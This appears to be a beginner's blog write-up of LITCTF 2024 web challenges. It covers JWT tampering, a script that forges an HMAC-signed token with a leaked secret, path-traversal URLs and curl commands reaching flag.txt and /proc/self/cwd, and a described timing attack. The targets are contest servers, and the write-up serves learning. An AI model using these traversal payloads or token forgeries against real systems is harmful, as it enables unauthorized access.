---
title: LITCTF 2024 Writeup
date: 2024-08-14 22:00:00 +0600
categories: [ctf-2024, litctf-2024]
tags: [ctf-2024, litctf-2024]     # TAG names should always be lowercase
author: refaat
description: beginner level ctf organized by LexMACS (Mathematical Computer Science Club) at Lexington High School in Massachusetts
---

## Overview
I attempted mainly the web challenges, as I'm trying to get better in that category. This CTF was easier than previous ones I've participated in, but felt a bit challenging as I'm still a beginner! I also tried the misc category. In the future, I want to try crypto, pwn & rev, but one step at a time I guess!

This writeup will be about the web challenges (solved + unsolved). All challenges in web were authored by **halp**.

Participated solo (466/1326) teams - solved 3/6 challs in web, 3/7 in misc. 
username : *shreddedcheese*

Scoreboard - [https://lit.lhsmathcs.org/ctf/scoreboard](https://lit.lhsmathcs.org/ctf/scoreboard) 

## web/anti-inspect
can you find the answer? WARNING: do not open the link your computer will not enjoy it much. URL: http://litctf.org:31779/ Hint: If your flag does not work, think about how to style the output of console.log

### Approach
Try opening the link in your browser and observe that it becomes unresponsive.

Try making the request with curl. We get the following output:

![Desktop View](https://drive.google.com/thumbnail?id=19wumpuzaSEGbo6PDZs5ktnDC27F7aZQg&sz=w1000){: w="700" h="400" }
*Image 1 : making a request with curl for web/anti-inspect*

Putting this flag tells us that it is the wrong flag!

Hmm, let’s make use of the hint from the description. It turns out %c is [used for styling console outputs](https://developer.chrome.com/docs/devtools/console/format-style#:~:text=messages%20in%20DevTools.-,Style%20with%20format%20specifier,-You%20can%20use): 
LITCTF{your_%cfOund_teh_fI@g_94932}

So the correct flag is : ``` LITCTF{your_fOund_teh_fI@g_94932} ```


## web/jwt-1
I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/.

### Approach
Explore the website

Clicking on “GET FLAG” returns the page : Unauthorized

Intercept requests with Burp Suite. Hmm, nothing interesting.

![Desktop View](https://drive.google.com/thumbnail?id=1nXAUCI91vYxixrut2-njF8Mxwnz-slic&sz=w1000){: w="700" h="400" }
*Image 2 : intercepting requests with Burp Suite*

Okay, we can create accounts, let’s try creating one.

username - ret & password - 123

If you keep the intercept on, you’ll notice that you get a token after creating the account.

![Desktop View](https://drive.google.com/thumbnail?id=1QIvHYuDIT9bzaaE845tigA0HZjmWMAr5&sz=w1000){: w="700" h="400" }
*Image 3 : we get the JWT token after creating an account*

Now, if we try to click on “GET FLAG” again, we will notice that the token is passed. Let’s try to understand what it is. 

It’s obviously a **JWT(JSON Web Token)**. Let’s head over to https://jwt.io/ and decode this.

![Desktop View](https://drive.google.com/thumbnail?id=1BBjZljHkgnV2eptZ5sZHdJQ8giVTs-Ul&sz=w1000){: w="700" h="400" }
*Image 4 : decoding the JWT token*


Hmm, admin is set to false. Let’s set it to true.

And copy the new token from the left side of the screen and paste it in our Cookie:token=

Now forward the request.

Voila!

``` LITCTF{o0ps_forg0r_To_v3rify_1re4DV9} ```



## web/jwt-2
its like jwt-1 but this one is harder URL: http://litctf.org:31777/

We are given the same UI as the previous problem.
Tried the same approach as before, and we get the following output : Unauthorized ;)

Hmm, we’re given the source code. Let’s try analyzing that.

Let's look at what happens when we hit the /flag endpoint.

```typescript
app.get("/flag", (req, res) => {
  if (!req.cookies.token) {
    console.log('no auth')
    return res.status(403).send("Unauthorized");
  }

  try {
    const token = req.cookies.token;
    // split up token
    const [header, payload, signature] = token.split(".");
    if (!header || !payload || !signature) {
      return res.status(403).send("Unauthorized");
    }
    Buffer.from(header, "base64").toString();
    // decode payload
    const decodedPayload = Buffer.from(payload, "base64").toString();
    // parse payload
    const parsedPayload = JSON.parse(decodedPayload);
		// verify signature
		const expectedSignature = crypto.createHmac('sha256', jwtSecret).update(header + '.' + payload).digest('base64').replace(/=/g, '');
		if (signature !== expectedSignature) {
			return res.status(403).send('Unauthorized ;)');
		}
    // check if user is admin
    if (parsedPayload.admin || !("name" in parsedPayload)) {
      return res.send(
        fs.readFileSync(path.join(__dirname, "flag.txt"), "utf-8")
      );
    } else {
      return res.status(403).send("Unauthorized");
    }
  } catch {
    return res.status(403).send("Unauthorized");
  }
});
```
From the source code, it’s clear that the encoded version of the header & payload are unchanged. The signature is calculated again using the sha256 algorithm and it’s compared against the given signature. Apparently, this is a symmetric key algorithm and the same key is used to encrypt and decrypt the algorithm.

So, all we have to do is figure out the signature. Normally, the secret wouldn’t have been given and here, it was unintentionally revealed (according to the problem author in the post-competition discussion in discord). In that case we would’ve had to brute force (probably from rockyou.txt) and figure out the secret. I am not so sure how to do that, but *I should figure it out (for future CTFs)*.

So, that’s it. Just compute the signature:

```javascript
const crypto = require('crypto')
let jwtSecret = "xook"
let jwtHeader = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
let payload = `eyJuYW1lIjoidXNlcjk5IiwiYWRtaW4iOnRydWV9`


const newPayload = Buffer.from('{"name":"user99","admin":true}').toString('base64').replace(/=/g, ''); 
const newSignature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + payload).digest('base64').replace(/=/g, '');


console.log(`${jwtHeader}.${payload}.${newSignature}`)

// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidXNlcjk5IiwiYWRtaW4iOnRydWV9.K4ncsDP+fr7cNoCjjzZhxjReuU2W/g8yAh92UwQK85Q

```

Now, enter this token in the intercepted request in Burp Suite to get the flag :

LITCTF{v3rifyed_thI3_Tlme_1re4DV9}

## Unsolved

*I couldn't solve the following challenges during the competition, even though attempted all of them except one. I will share my approach and the solution to the problems as well.*

## web/traversed
I made this website! you can't see anything else though... right?? URL: http://litctf.org:31778/

### Approach
I was close to this. It’s the simplest type of directory traversal attack.

Basically, what I didn’t notice is that the server or browser (not sure which is it, most probably both) was “normalizing” the path. So we either have to encode it or we can make use of an interesting argument in curl. Some of the ways in which this can be done :


1. ```http://litctf.org:31778/..%2fflag.txt```  (credit to @beerpsi from Discord)
2. ```curl http://litctf.org:31778/%2e%2e/%2e%2e/%2e%2e/proc/self/cwd/flag.txt``` (credit to [https://hxuu.github.io/blog/ctf/lit24/traversed/]() )
3. ```curl --path-as-is http://litctf.org:31778/../flag.txt``` (credit to @nikloskoda from Discord)

Flag is - ``` LITCTF{backtr@ked_230fim0} ```


## web/kirbytime

### Approach 
My approach was to brute force all the passwords containing the word ‘kirby’ and was of length 7. I used different wordlists found in kali. I gave up after trying many wordlists. Mostly tried ones in the root directory. 

### Solution
However, the key to solving this problem lies in identifying that if the characters don’t match, then the requests take longer to process. We can use this info to try out different characters at a particular index. If it is correct, it will take one second more.

![Desktop View](https://drive.google.com/thumbnail?id=1Vx7b9YKZ_TuCjp1rTtumgsJIzxE3ay7R&sz=w1000){: w="700" h="400" }
*Image 5 : timing attack*

So what should be our character set? For some reason, it’s obvious to everyone to use all alphabets (lower and upper case) and numbers. My question is, why not other characters?

At every position, we just try out different characters and find which one took the longest time. That will be our correct character for that index.

I will just link a fellow good person’s solution here. Huge credits to this person for explaining it so nicely:

[https://abuctf.github.io/posts/LITCTF/#kirbytime](https://abuctf.github.io/posts/LITCTF/#kirbytime)

## web/scrainbow
Oh no! someone dropped my perfect gradient and it shattered into 10000 pieces! I can't figure out how to put it back together anymore, it never looks quite right. Can you help me fix it? URL: http://litctf.org:31780/

### Thoughts
I didn’t even understand what the problem was about. I will update once I get a clear understanding.
